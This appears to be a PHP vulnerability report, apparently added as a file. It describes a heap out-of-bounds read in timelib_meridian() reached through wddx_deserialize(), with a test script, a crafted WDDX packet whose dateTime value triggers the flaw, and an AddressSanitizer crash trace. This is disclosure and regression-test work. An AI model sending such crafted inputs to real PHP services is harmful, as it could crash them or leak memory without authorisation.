@@ -1,0 +1,142 @@
+Description:
+------------
+A heap out-of-bound read vulnerability in timelib_meridian() can be triggered via wddx_deserialize() or other vectors that call into this function on untrusted inputs.
+
+$ ~/php-7.1.8/sapi/cli/php --version
+PHP 7.1.8 (cli) (built: Aug  9 2017 21:42:13) ( NTS )
+Copyright (c) 1997-2017 The PHP Group
+Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies
+
+Configuration:
+CC="`which gcc`" CFLAGS="-O0 -g -fsanitize=address" ./configure --disable-shared --enable-wddx
+
+Credit:
+Wei Lei and Liu Yang of Nanyang Technological University
+
+Test script:
+---------------
+$ cat wddx.php 
+*/
+<?php
+$argc = $_SERVER['argc'];
+$argv = $_SERVER['argv'];
+
+$dir_str = dirname(__FILE__);
+
+$file_str = ($dir_str)."/".$argv[1];
+
+if (!extension_loaded('wddx')) print "wddx not loaded.\n";
+
+$wddx_str = file_get_contents($file_str);
+print strlen($wddx_str) . " bytes read.\n";
+
+var_dump(wddx_deserialize($wddx_str));
+?>
+
+/*
+$ cat repro2.wddx 
+<?xml version='1.0'?>
+<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
+<wddxPacket version='1.0'>
+<header/>
+	<data>
+        	<struct>
+                    <var name='aDateTime'>
+                         <dateTime>frONt of 0 0</dateTime>
+                     </var>
+                </struct>
+	</data>
+</wddxPacket>
+
+/*
+Expected result:
+----------------
+NO CRASH
+
+Actual result:
+--------------
+$ ~/php-7.1.8/sapi/cli/php wddx.php repro2.wddx 
+309 bytes read.
+=================================================================
+==13788== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb57057fc at pc 0x809b622 bp 0xbf9d09d8 sp 0xbf9d09cc
+READ of size 1 at 0xb57057fc thread T0
+    #0 0x809b621 in timelib_meridian /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:410
+    #1 0x80e0293 in scan /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:18228
+    #2 0x80f0710 in timelib_strtotime /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:23194
+    #3 0x806afed in php_parse_date /home/weilei/php-7.1.8/ext/date/php_date.c:1455
+    #4 0x8a2c588 in php_wddx_process_data /home/weilei/php-7.1.8/ext/wddx/wddx.c:1071
+    #5 0x8a40f7b in _cdata_handler /home/weilei/php-7.1.8/ext/xml/compat.c:265
+    #6 0xb5cc06b5 in xmlParseCharData__internal_alias /home/weilei/libxml2/parser.c:4597
+    #7 0xb5d129be in xmlParseTryOrFinish /home/weilei/libxml2/parser.c:11715
+    #8 0xb5d1a462 in xmlParseChunk__internal_alias /home/weilei/libxml2/parser.c:12454
+    #9 0x8a42de6 in php_XML_Parse /home/weilei/php-7.1.8/ext/xml/compat.c:600
+    #10 0x8a2c974 in php_wddx_deserialize_ex /home/weilei/php-7.1.8/ext/wddx/wddx.c:1105
+    #11 0x8a2f394 in zif_wddx_deserialize /home/weilei/php-7.1.8/ext/wddx/wddx.c:1323
+    #12 0x8ddcd0b in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:675
+    #13 0x8dd70df in execute_ex /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:429
+    #14 0x8dd8845 in zend_execute /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:474
+    #15 0x8c32247 in zend_execute_scripts /home/weilei/php-7.1.8/Zend/zend.c:1476
+    #16 0x8a5fbc5 in php_execute_script /home/weilei/php-7.1.8/main/main.c:2537
+    #17 0x90f5a70 in do_cli /home/weilei/php-7.1.8/sapi/cli/php_cli.c:993
+    #18 0x90f834b in main /home/weilei/php-7.1.8/sapi/cli/php_cli.c:1381
+    #19 0xb5ab9a82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)
+    #20 0x8065230 in _start (/home/weilei/php-7.1.8/sapi/cli/php+0x8065230)
+0xb57057fc is located 0 bytes to the right of 12-byte region [0xb57057f0,0xb57057fc)
+allocated by thread T0 here:
+    #0 0xb6168854 (/usr/lib/i386-linux-gnu/libasan.so.0+0x16854)
+    #1 0x8b73387 in __zend_malloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2820
+    #2 0x8b704a6 in _emalloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2413
+    #3 0x8b710f1 in _safe_emalloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2472
+    #4 0x8b7164c in _ecalloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2495
+    #5 0x809bd8a in timelib_string /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:460
+    #6 0x80dfcbb in scan /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:18215
+    #7 0x80f0710 in timelib_strtotime /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:23194
+    #8 0x806afed in php_parse_date /home/weilei/php-7.1.8/ext/date/php_date.c:1455
+    #9 0x8a2c588 in php_wddx_process_data /home/weilei/php-7.1.8/ext/wddx/wddx.c:1071
+    #10 0x8a40f7b in _cdata_handler /home/weilei/php-7.1.8/ext/xml/compat.c:265
+    #11 0xb5cc06b5 in xmlParseCharData__internal_alias /home/weilei/libxml2/parser.c:4597
+    #12 0xb5d129be in xmlParseTryOrFinish /home/weilei/libxml2/parser.c:11715
+    #13 0xb5d1a462 in xmlParseChunk__internal_alias /home/weilei/libxml2/parser.c:12454
+    #14 0x8a42de6 in php_XML_Parse /home/weilei/php-7.1.8/ext/xml/compat.c:600
+    #15 0x8a2c974 in php_wddx_deserialize_ex /home/weilei/php-7.1.8/ext/wddx/wddx.c:1105
+    #16 0x8a2f394 in zif_wddx_deserialize /home/weilei/php-7.1.8/ext/wddx/wddx.c:1323
+    #17 0x8ddcd0b in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:675
+    #18 0x8dd70df in execute_ex /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:429
+    #19 0x8dd8845 in zend_execute /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:474
+    #20 0x8c32247 in zend_execute_scripts /home/weilei/php-7.1.8/Zend/zend.c:1476
+    #21 0x8a5fbc5 in php_execute_script /home/weilei/php-7.1.8/main/main.c:2537
+    #22 0x90f5a70 in do_cli /home/weilei/php-7.1.8/sapi/cli/php_cli.c:993
+    #23 0x90f834b in main /home/weilei/php-7.1.8/sapi/cli/php_cli.c:1381
+    #24 0xb5ab9a82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:410 timelib_meridian
+Shadow bytes around the buggy address:
+  0x36ae0aa0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0ab0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0ac0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0ad0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0ae0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0x36ae0af0: fa fa fa fa fa fa fa fa fa fa fd fa fa fa 00[04]
+  0x36ae0b00:fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0b10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0b20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0b30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x36ae0b40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+==13788== ABORTING
+Aborted
+*/
